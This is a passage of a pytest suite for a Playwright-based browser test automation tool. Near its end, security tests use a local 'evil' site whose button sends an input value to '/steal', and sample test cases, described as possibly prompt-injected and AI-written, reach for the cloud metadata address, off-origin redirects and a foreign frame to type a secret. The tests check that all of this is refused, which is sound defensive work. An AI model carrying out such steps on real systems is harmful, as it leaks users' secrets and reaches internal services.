    assert rec["run"]["planted_found"] == ["AC-2"] and rec["run"]["false_failures"] == []
    assert code == 0, rec["missed"]
    # a weak set: one happy-path case, untraced → the bar is missed
    weak = lambda s, m, c: ([{"test_case_id": "W1", "title": "works", "automation_steps": login}], None)  # noqa: E731
    assert gq.run(str(ROOT / "evals/data/generation_stories.json"), str(tmp_path / "w.json"), generate=weak) == 1
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    assert gq.run(str(ROOT / "evals/data/generation_stories.json"), str(tmp_path / "n.json")) == 2


def test_elements_inside_a_web_component_shadow_root_are_read_and_used(ui_app):
    """Web components (Lit, Ionic, Salesforce) keep their form in a shadow root: the reader used
    to see an empty page there. Read, name, fill, click and check inside it."""
    from playwright.async_api import async_playwright

    from core.dom_analyzer import label_page

    async def read():
        async with async_playwright() as p:
            b = await p.chromium.launch()
            pg = await b.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/shadow")
            await pg.wait_for_timeout(200)
            els, _ = await label_page(pg)
            await b.close()
            return els
    els = asyncio.run(read())
    assert els.get("your_name") == "#who" and els.get("greet_button") == "#greet", els
    case = {"test_case_id": "SH", "title": "greet inside a shadow root", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/shadow"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": els["your_name"], "value": "Sara"},
        {"step_number": 3, "playwright_action": "click", "selector_key": els["greet_button"]},
        {"step_number": 4, "playwright_action": "assert", "selector_key": "#hello",
         "assertion_type": "text", "assertion_value": "Hello, Sara"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error"))
                                   for s in r["steps"]]


def test_a_session_recorded_by_hand_is_reused_by_reading_and_by_runs(ui_app, tmp_path, monkeypatch):
    """SSO / 2FA apps: the operator logs in once by hand; QAX keeps the browser session for the
    project and both `map` and browser runs start logged in — no password anywhere."""
    from playwright.async_api import async_playwright

    import core.session_state as ss
    from core.app_mapper import map_app
    monkeypatch.setattr(ss, "CONFIG_DIR", tmp_path / "projects")
    path = ss.state_path("uidemo")
    path.parent.mkdir(parents=True)

    async def login_by_hand():       # stands in for the operator in the visible window
        async with async_playwright() as p:
            b = await p.chromium.launch()
            ctx = await b.new_context()
            pg = await ctx.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/login")
            await pg.fill("#username", "demo")
            await pg.fill("#password", "demo123")
            await pg.click("#login-btn")
            await pg.wait_for_url("**/dashboard")
            await ctx.storage_state(path=str(path))
            await b.close()
    asyncio.run(login_by_hand())
    assert ss.has_state("uidemo") and ss.state_for("other") is None
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=["/dashboard"],
                            storage_state=ss.state_for("uidemo")))
    assert "/dashboard" in {p["path"] for p in m.pages}, [p["path"] for p in m.pages]
    case = {"test_case_id": "SESS", "title": "starts logged in", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/dashboard"},
        {"step_number": 2, "playwright_action": "assert", "selector_key": "#welcome",
         "assertion_type": "text", "assertion_value": "Welcome, demo"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result")) for s in r["steps"]]
    assert ss.forget("uidemo") and not ss.has_state("uidemo")


def test_ci_runs_the_cases_without_a_prompt_and_writes_junit(ui_app, tmp_path):
    """CI: `execute --yes --junit` — no prompt, JUnit XML a CI dashboard reads, exit code 1 when
    a case fails (the planted bug), and the step evidence inside the failure."""
    import os as _os
    import subprocess
    import sys
    import xml.etree.ElementTree as ET
    env = dict(_os.environ, CI="true", DRY_RUN="true", AUTO_BUG_REPORT="false", QAX_AI_HEAL="false")
    junit = tmp_path / "junit.xml"
    p = subprocess.run([sys.executable, str(ROOT / "main.py"), "execute", "--file", str(ROOT / "evals/data/ui_demo_cases.json"),
                        "--project", "uidemo", "--base-url", f"http://127.0.0.1:{ui_app}", "--yes",
                        "--junit", str(junit), "--output", str(tmp_path / "r" / "x.html")],
                       cwd=tmp_path, env=env, capture_output=True, text=True, timeout=240)
    assert "Proceed with execution?" not in p.stdout
    assert p.returncode == 1, p.stdout[-800:] + p.stderr[-800:]
    suite = ET.parse(junit).getroot()
    assert suite.get("tests") == "5" and suite.get("failures") == "1"
    failed = [c for c in suite if c.find("failure") is not None]
    assert "TC-UI-004" in failed[0].get("name") and "#7 FAIL" in failed[0].find("failure").text
    assert int(suite.get("skipped")) + int(suite.get("errors")) == 1          # the unrunnable case is not a pass


def test_mobile_device_and_parallel_workers_give_the_same_verdicts(ui_app, monkeypatch):
    """`--device mobile`: a phone screen with touch and a mobile user agent; `--workers 2`:
    two browsers at once — the verdicts are the truth either way, in the cases' order."""
    from execution.test_executor import run_parallel
    cases = json.loads((ROOT / "evals/data/ui_demo_cases.json").read_text(encoding="utf-8"))["test_cases"]
    probe = {"test_case_id": "DEV", "title": "screen", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"}]}
    monkeypatch.setenv("QAX_DEVICE", "mobile")
    batch = asyncio.run(run_parallel(cases + [probe], 2))
    by = {r["test_case_id"]: r["status"] for r in batch["results"]}
    assert [r["test_case_id"] for r in batch["results"]] == [c["test_case_id"] for c in cases] + ["DEV"]
    assert by["TC-UI-001"] == "PASS" and by["TC-UI-004"] == "FAIL" and by["TC-UI-005"] != "PASS", by
    assert batch["workers"] == 2 and batch["failed"] == 1

    from execution.playwright_runner import PlaywrightRunner

    async def screen():
        r = PlaywrightRunner()
        await r.setup(headless=True)
        try:
            await r.page.goto(f"http://127.0.0.1:{ui_app}/login")
            return await r.page.evaluate("[screen.width, navigator.maxTouchPoints > 0, /Mobile/.test(navigator.userAgent)]")
        finally:
            await r.teardown()
    w, touch, mobile_ua = asyncio.run(screen())
    assert w < 500 and touch and mobile_ua


def test_cleanup_steps_undo_what_a_case_created_and_visual_checks_find_a_changed_screen(ui_app, monkeypatch, tmp_path):
    """cleanup_steps run after the case (pass or fail) and delete what it created; with
    --visual the first run saves the screen, an unchanged screen is identical and a changed
    one is reported (a lead with a diff image) — the verdict never changes."""
    import urllib.request
    monkeypatch.setenv("QAX_VISUAL", "true")
    login = [{"playwright_action": "navigate", "value": "/login"},
             {"playwright_action": "fill", "selector_key": "#username", "value": "demo"},
             {"playwright_action": "fill", "selector_key": "#password", "value": "demo123"},
             {"playwright_action": "click", "selector_key": "#login-btn"}]
    case = {"test_case_id": "CLN", "title": "add then clean up", "automation_steps": login + [
        {"playwright_action": "fill", "selector_key": "#note-input", "value": "temp {{unique}}"},
        {"playwright_action": "click", "selector_key": "#add-note-btn"},
        {"playwright_action": "assert", "selector_key": "#notes", "assertion_type": "text", "assertion_value": "temp"}],
        "cleanup_steps": [{"playwright_action": "navigate", "value": "/notes/manage"},
                          {"playwright_action": "click", "selector_key": "button:has-text('Delete \"temp {{unique}}\"')"}]}
    still = {"test_case_id": "VIS", "title": "a still screen", "automation_steps": [
        {"playwright_action": "navigate", "value": "/a11y"}, {"playwright_action": "wait"}]}
    r = _run([case, still])["results"]
    assert r[0]["status"] == "PASS" and r[0]["cleanup"]["status"] == "done", r[0].get("cleanup")
    left = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{ui_app}/_notes").read())["notes"]
    assert not [n for n in left if n.startswith("temp")], left                 # nothing left behind
    assert r[1]["visual"]["status"] == "baseline_saved"
    assert _run([still])["results"][0]["visual"]["status"] == "identical"
    changed = {"test_case_id": "VIS", "title": "same case, other screen", "automation_steps": [
        {"playwright_action": "navigate", "value": "/obstacles"}, {"playwright_action": "wait"}]}
    v = _run([changed])["results"][0]
    assert v["status"] == "PASS" and v["visual"]["status"] in ("changed", "dimension_mismatch")
    if v["visual"]["status"] == "changed":
        assert v["visual"]["diff"].endswith(".diff.png")


def _browser_installed(name: str) -> bool:
    import os as _os
    from pathlib import Path as _P
    cache = _P(_os.getenv("PLAYWRIGHT_BROWSERS_PATH") or (_P.home() / ("Library/Caches/ms-playwright" if sys.platform == "darwin" else ".cache/ms-playwright")))
    return cache.is_dir() and any(p.name.startswith(name) for p in cache.iterdir())


@pytest.mark.parametrize("browser", ["firefox", "webkit"])
def test_the_same_cases_give_the_same_verdicts_in_firefox_and_webkit(ui_app, monkeypatch, browser):
    """Cross-browser: the demo cases in Firefox and WebKit (Safari's engine) — the planted bug
    FAILS, the rest PASS, the unrunnable step is not a pass; plus a web component and an iframe."""
    if not _browser_installed(browser):
        pytest.skip(f"{browser} not installed (python -m playwright install {browser})")
    monkeypatch.setenv("QAX_BROWSER", browser)
    cases = json.loads((ROOT / "evals/data/ui_demo_cases.json").read_text(encoding="utf-8"))["test_cases"]
    extra = [{"test_case_id": "SH", "title": "shadow", "automation_steps": [
                 {"playwright_action": "navigate", "value": "/shadow"},
                 {"playwright_action": "fill", "selector_key": "#who", "value": "Sara"},
                 {"playwright_action": "click", "selector_key": "#greet"},
                 {"playwright_action": "assert", "selector_key": "#hello", "assertion_type": "text", "assertion_value": "Hello, Sara"}]},
             {"test_case_id": "IF", "title": "iframe", "automation_steps": [
                 {"playwright_action": "navigate", "value": "/frames"},
                 {"playwright_action": "fill", "selector_key": "iframe#pay-frame >>> #card", "value": "4242"},
                 {"playwright_action": "click", "selector_key": "#pay"},
                 {"playwright_action": "assert", "selector_key": "#paid", "assertion_type": "text", "assertion_value": "Paid with 4242"}]}]
    by = {r["test_case_id"]: r["status"] for r in _run(cases + extra)["results"]}
    assert by == {"TC-UI-001": "PASS", "TC-UI-002": "PASS", "TC-UI-003": "PASS", "TC-UI-004": "FAIL",
                  "TC-UI-005": by["TC-UI-005"], "SH": "PASS", "IF": "PASS"}, by
    assert by["TC-UI-005"] != "PASS"


def test_row_buttons_are_tied_to_their_row_and_numeric_ids_are_not_trusted(ui_app):
    """Found on PetClinic Angular: 'Delete' in row 3 was selected by its position and inputs by
    id='0','1' (row indexes) — a row added or deleted above sends the click to another record."""
    from playwright.async_api import async_playwright

    from core.dom_analyzer import label_page

    async def read():
        async with async_playwright() as p:
            b = await p.chromium.launch()
            pg = await b.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/team")
            els, _ = await label_page(pg)
            await b.close()
            return els
    els = asyncio.run(read())
    assert "grace_hopper" in els.get("edit_grace_hopper_button", "").lower().replace(" ", "_") or \
        "Grace Hopper" in els.get("edit_grace_hopper_button", ""), els
    assert not any(v in ("#\\30 ", "#\\31 ", "#0", "#1") for v in els.values()), els
    case = {"test_case_id": "ROW", "title": "delete a row above, then edit by name", "automation_steps": [
        {"playwright_action": "navigate", "value": "/team"},
        {"playwright_action": "click", "selector_key": els["delete_ada_lovelace_button"]},
        {"playwright_action": "click", "selector_key": els["edit_grace_hopper_button"]},
        {"playwright_action": "assert", "selector_key": "#out", "assertion_type": "text", "assertion_value": "Edit Grace Hopper"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error")) for s in r["steps"]]


def test_page_text_checks_see_what_is_shown_in_form_fields(ui_app):
    """PetClinic Angular shows its specialties inside inputs: innerText misses them. A text check
    counts visible field values (never a password); a value not on screen still fails."""
    case = {"test_case_id": "FV", "title": "field values are page text", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "#username", "value": "zed-visible"},
        {"step_number": 3, "playwright_action": "fill", "selector_key": "#password", "value": "pw-hidden"},
        {"step_number": 4, "playwright_action": "assert", "selector_key": "page", "assertion_type": "contains", "assertion_value": "zed-visible"}]}
    secret = {"test_case_id": "PW", "title": "a password is never page text", "automation_steps": case["automation_steps"][:3] + [
        {"step_number": 4, "playwright_action": "assert", "selector_key": "page", "assertion_type": "contains", "assertion_value": "pw-hidden"}]}
    r = {x["test_case_id"]: x["status"] for x in _run([case, secret])["results"]}
    assert r == {"FV": "PASS", "PW": "FAIL"}, r


def test_card_buttons_are_tied_to_their_product_and_count_links_get_a_real_name(ui_app):
    """Found on eShopOnWeb: '[ ADD TO BASKET ]' on every product card was selected by position, and
    the basket link (text: the item count '0') was named '0_link'."""
    from playwright.async_api import async_playwright

    from core.dom_analyzer import label_page

    async def read():
        async with async_playwright() as p:
            b = await p.chromium.launch()
            pg = await b.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/shop")
            els, _ = await label_page(pg)
            await b.close()
            return els
    els = asyncio.run(read())
    assert "basket_page_link" in els and "0_link" not in els, els
    key = next(k for k in els if "bot_shirt" in k)
    assert "nth-of-type" not in els[key], els
    case = {"test_case_id": "CARD", "title": "add the right product", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/shop"},
        {"step_number": 2, "playwright_action": "click", "selector_key": els[key]},
        {"step_number": 3, "playwright_action": "assert", "selector_key": "#out", "assertion_type": "text", "assertion_value": "Added Bot Shirt"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error")) for s in r["steps"]]


@pytest.fixture
def evil_site():
    """A second local 'site' that records every request it gets (the attacker in these tests)."""
    from flask import Flask, request as freq
    from werkzeug.serving import make_server
    seen = []
    evil = Flask("evil")

    @evil.route("/", defaults={"p": ""}, methods=["GET", "POST"])
    @evil.route("/<path:p>", methods=["GET", "POST"])
    def anything(p):
        seen.append(f"{freq.method} /{p} {freq.get_data(as_text=True)}")
        return "<input id='x'><button id='go' onclick=\"fetch('/steal?v='+document.getElementById('x').value)\">go</button>"
    srv = make_server("127.0.0.1", 0, evil, threaded=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_port}/", seen
    srv.shutdown()


def test_a_test_case_cannot_take_the_browser_or_a_secret_to_another_site(ui_app, evil_site, monkeypatch):
    """P0 (security audit 2026-10-20): an AI-written (possibly prompt-injected) case could open
    another site — or a cloud metadata address — and type a {{env:QAX_VAR_*}} secret into it."""
    evil, seen = evil_site
    monkeypatch.setenv("QAX_VAR_CANARY", "canary-s3cret")
    steps = lambda *s: [dict(x, step_number=i) for i, x in enumerate(s, 1)]  # noqa: E731
    cases = [
        {"test_case_id": "NAV", "title": "navigate away", "automation_steps": steps(
            {"playwright_action": "navigate", "value": evil})},
        {"test_case_id": "META", "title": "metadata", "automation_steps": steps(
            {"playwright_action": "navigate", "value": "http://169.254.169.254/latest/meta-data/"})},
        {"test_case_id": "AT", "title": "userinfo trick", "automation_steps": steps(
            {"playwright_action": "navigate", "value": "@" + evil.split("//")[1]})},
        {"test_case_id": "CLICK", "title": "a link leaves the app", "automation_steps": steps(
            {"playwright_action": "navigate", "value": f"/link-away?to={evil}"},
            {"playwright_action": "click", "selector_key": "#out-link"},
            {"playwright_action": "fill", "selector_key": "#x", "value": "{{env:QAX_VAR_CANARY}}"},
            {"playwright_action": "click", "selector_key": "#go"})},
        {"test_case_id": "REDIR", "title": "a redirect leaves the app", "automation_steps": steps(
            {"playwright_action": "navigate", "value": f"/away?to={evil}"})},
        {"test_case_id": "FRAME", "title": "a secret into a foreign frame", "automation_steps": steps(
            {"playwright_action": "navigate", "value": f"/link-away?to={evil}"},
            {"playwright_action": "fill", "selector_key": "iframe#foreign >>> #x", "value": "{{env:QAX_VAR_CANARY}}"})},
    ]
    res = {r["test_case_id"]: r for r in _run(cases)["results"]}
    assert all(res[c]["status"] != "PASS" for c in ("NAV", "META", "REDIR")), [(k, v["status"], [(s.get("actual_result"), s.get("error")) for s in v["steps"]]) for k, v in res.items() if k in ("REDIR",)]
    # "@evil:port/" is joined as a PATH of the app — it stays on the app's own origin
    assert f"127.0.0.1:{ui_app}/" in res["AT"]["steps"][0]["actual_result"], res["AT"]["steps"][0]
    assert "refused" in res["NAV"]["steps"][0]["error"] and "refused" in res["META"]["steps"][0]["error"]
    assert "refused" in (res["FRAME"]["steps"][1].get("error") or "")
    assert not [s for s in seen if "canary" in s], seen                     # the secret never left
    assert not [s for s in seen if s.startswith("GET / ")], seen   # no top-level visit (an embedded frame may load)
    kinds = {e["kind"] for r in res.values() for e in r.get("page_errors", [])}
    assert "blocked navigation" in kinds


def test_the_app_reader_never_reads_or_logs_in_to_another_site(ui_app, evil_site):
    from core.app_mapper import map_app
    evil, seen = evil_site
    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=[f"/away?to={evil}login"],
                            username="demo", password="demo123"))
    assert not any(p["path"].startswith("/login") and "evil" in p.get("title", "") for p in m.pages)
    assert not [s for s in seen if s.startswith("POST")], seen               # no password posted there
    assert any("off-origin" in s for s in m.skipped_links), m.skipped_links


def test_a_trace_of_a_case_that_types_a_secret_is_not_kept(ui_app, monkeypatch):
    monkeypatch.setenv("QAX_TRACE", "true")
    monkeypatch.setenv("QAX_VAR_CANARY", "canary-s3cret")
    case = {"test_case_id": "TR", "title": "types a secret", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "#password", "value": "{{env:QAX_VAR_CANARY}}"}]}
    plain = {"test_case_id": "TP", "title": "no secret", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "#username", "value": "demo"}]}
    r = {x["test_case_id"]: x for x in _run([case, plain])["results"]}
    assert "trace" not in r["TR"] and "secret" in r["TR"]["trace_note"]
    import os as _os
    assert r["TP"].get("trace") and oct(_os.stat(r["TP"]["trace"]).st_mode & 0o777) == "0o600"


def test_a_dialog_submit_that_repeats_its_opener_keeps_its_established_name(ui_app):
    """Benchmark 2026-10-20: tying every repeated button to a title renamed Beszel's dialog submit
    (add_system_button_2) and broke its cases. Only rows and 3+ cards are tied to a title."""
    from playwright.async_api import async_playwright

    from core.dom_analyzer import label_page

    async def read():
        async with async_playwright() as p:
            b = await p.chromium.launch()
            pg = await b.new_page()
            await pg.goto(f"http://127.0.0.1:{ui_app}/dialog")
            await pg.click("text=Add item")
            els, _ = await label_page(pg)
            await b.close()
            return els
    els = asyncio.run(read())
    assert "add_item_button" in els and "add_item_button_2" in els, els


def test_a_rate_limited_login_is_an_error_even_when_the_message_is_gone_by_the_end(ui_app):
    """Benchmark 2026-10-20 (Healthchecks): the app answered a login with 200 + "Too many attempts",
    the case moved on to another page, and the failure later on was reported as FAIL (a false bug).
    The answer is now checked when it arrives."""
    case = {"test_case_id": "RL", "title": "rate-limited login", "automation_steps": [
        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
        {"step_number": 2, "playwright_action": "fill", "selector_key": "#username", "value": "throttled"},
        {"step_number": 3, "playwright_action": "fill", "selector_key": "#password", "value": "x"},
        {"step_number": 4, "playwright_action": "click", "selector_key": "#login-btn"},
        {"step_number": 5, "playwright_action": "navigate", "value": "/shop"},
        {"step_number": 6, "playwright_action": "assert", "selector_key": "page", "assertion_type": "contains",
         "assertion_value": "Welcome, demo"}]}
    r = _run([case])["results"][0]
    assert r["status"] == "ERROR" and r.get("throttled"), (r["status"], r.get("error"))


def test_a_failed_case_keeps_its_network_log_without_secrets_and_a_cause(ui_app, monkeypatch):
    """P1 (2026-10-20): a HAR for every case that does not pass — the evidence for "what did the
    server say?" — with no password, token or cookie in it; each failure gets its cause."""
    monkeypatch.setenv("QAX_VAR_CANARY", "demo123")          # the demo password, typed from a secret
    cases = json.loads((ROOT / "evals/data/ui_demo_cases.json").read_text(encoding="utf-8"))["test_cases"]
    planted = next(c for c in cases if c["test_case_id"] == "TC-UI-004")
    for st in planted["automation_steps"]:
        if st.get("value") == "demo123":
            st["value"] = "{{env:QAX_VAR_CANARY}}"
    ok = next(c for c in cases if c["test_case_id"] == "TC-UI-001")
    res = {r["test_case_id"]: r for r in _run([planted, ok])["results"]}
    bad = res["TC-UI-004"]
    assert bad["status"] == "FAIL" and bad["cause"] == "app" and "network_log" not in res["TC-UI-001"]
    har = json.loads(open(bad["network_log"], encoding="utf-8").read())
    entries = har["log"]["entries"]
    assert har["log"]["version"] == "1.2" and any("/notes" in e["request"]["url"] for e in entries)
    raw = open(bad["network_log"], encoding="utf-8").read()
    assert "demo123" not in raw and "sid=" not in raw                       # no password, no session cookie
    import os as _os
    assert oct(_os.stat(bad["network_log"]).st_mode & 0o777) == "0o600"
